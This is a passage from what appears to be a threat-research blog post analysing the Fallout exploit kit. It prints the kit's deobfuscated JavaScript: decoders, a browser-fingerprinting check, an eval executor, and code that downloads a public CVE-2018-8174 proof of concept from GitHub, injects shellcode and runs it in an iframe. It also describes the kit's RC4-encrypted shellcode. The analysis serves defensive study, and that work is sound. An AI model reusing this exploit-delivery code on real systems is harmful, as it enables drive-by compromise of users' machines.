        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">UK1Az5</span> <span class="o">=</span> <span class="nx">zxh4w4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">),</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">:</span> <span class="mi">191</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">224</span> <span class="p">?</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">31</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">c3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="p">(</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">c3</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next defined object is also for decoding.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">DwQ5oeN9ct</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">hxk4VZ3L8GC</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="nx">DwQ5oeN9ct</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">UsEJ64xf0P</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">D8H6A7MGHf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">D8H6A7MGHf</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">D8H6A7MGHf</span><span class="o">++</span><span class="p">,</span> <span class="nx">r5UpGh</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">r5UpGh</span> <span class="o">===</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
            <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nx">UsEJ64xf0P</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">D8H6A7MGHf</span><span class="p">)</span> <span class="o">^</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">r5UpGh</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">UsEJ64xf0P</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next object, make sure that it is not in Chrome and Opera using, for example, User-Agent.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">BITU978SF7</span> <span class="o">=</span> <span class="p">((</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">addons</span><span class="dl">'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opera</span><span class="dl">'</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">'</span><span class="s1">userAgent</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1"> OPR/</span><span class="dl">'</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">InstallTrigger</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">documentMode</span><span class="dl">'</span><span class="p">])</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">runtime</span><span class="dl">'</span><span class="p">]);</span>
    <span class="k">return</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">cMa5g</span><span class="dl">'</span><span class="p">](</span><span class="nx">BITU978SF7</span><span class="p">[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The next object is for executing code. This is the most important object.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">eval</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">]());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>With these codes, the following code will be executed. This downloads the encoded data and executes it.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">onreadystatechange</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">4</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">readyState</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="mi">200</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">status</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">W7iaUaId</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
        <span class="kd">var</span> <span class="nx">riqAvm0Is</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">W7iaUaId</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">riqAvm0Is</span><span class="p">[</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]();</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">mbwk99</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]());</span>
</code></pre></div></div>

<h2 id="encoded-data">Encoded data</h2>
<p>When decoding the code, it looks like the following.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">ZV7S8RUn</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-- Shellcode here --</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">dIl15w</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">XDomainRequest</span><span class="dl">'</span><span class="p">]();</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">onload</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">H2Kqgnp</span> <span class="o">=</span> <span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;script language="vbscript"&gt;</span><span class="dl">'</span><span class="p">),</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;/body&gt;</span><span class="dl">'</span><span class="p">));</span>
    <span class="kd">var</span> <span class="nx">l1a2N5kr</span> <span class="o">=</span> <span class="nx">WW7QZmX</span><span class="p">[</span><span class="dl">'</span><span class="s1">split</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">L8c4YdRG</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">L8c4YdRG</span> <span class="o">&lt;</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">L8c4YdRG</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="kd">var</span> <span class="nx">zEZGDPaGVEt</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">),</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">)));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">zEZGDPaGVEt</span><span class="p">,</span><span class="nx">ZV7S8RUn</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">TJIp1rglYoq</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">TJIp1rglYoq</span><span class="p">,</span><span class="dl">''</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">MsgBox</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">Alert</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">join</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">nbvMHPdb</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">nbvMHPdb</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">nbvMHPdb</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">ocH5HC2B</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">WW7QZmX</span><span class="p">);</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">https://raw.githubusercontent.com/w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>This code is exploit by replacing the shellcode part of PoC of CVE-2018-8174 on GitHub. We are finding that four PoCs are being exploited. There may be other things.</p>

<ul>
  <li>w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</li>
  <li>admintony/VulRec/master/CVE-2018-8174/calc.html</li>
  <li>kaisaryousuf/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
  <li>lovebair2022/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
</ul>

<h2 id="shellcode">Shellcode</h2>
<p><a href="https://www.nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In the previous blog</a> We wrote that Fallout uses RC4 and powershell. Currently, It decrypts with RC4 using multiple keys.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-6UVMjUup6qo/XHn461S2DQI/AAAAAAAAaAc/ihjgvwM48ds78W-1a50a5naMAiw-jtvwQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B121824.jpg" /></p>

<p><img alt="" src="https://1.bp.blogspot.com/-DymvnKJrNeE/XHn5O-hzKBI/AAAAAAAAaAs/s8JysGgcRwAk_vvDNVcUIIu8nLHY0LfswCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B123150.jpg" /></p>

<h3 id="encrypted-data">Encrypted data</h3>
<p>Encrypted data is near the end of the shell code.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-gsfXIhMYevM/XHn8WBk9ovI/AAAAAAAAaBg/10bGFzmcPOwREpu9jFcdDV_QNU_q428QQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B124509.jpg" /></p>

<p>The following strings are encrypted.</p>

<ul>
  <li>URL</li>
</ul>

<p><img alt="" src="https://3.bp.blogspot.com/-mGb6y9CcLgY/XHn_tTXITlI/AAAAAAAAaBs/Tx-IZGvfR7MKXeLZoduOknHsG-oG611mACLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094830.jpg" /></p>

<ul>
  <li>Path</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-nJQJtvhQ4ts/XHoAJThO_UI/AAAAAAAAaB0/AqdnhErozq4RtSn0IBPxDh26i1VIb3ySwCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094918.jpg" /></p>

<ul>
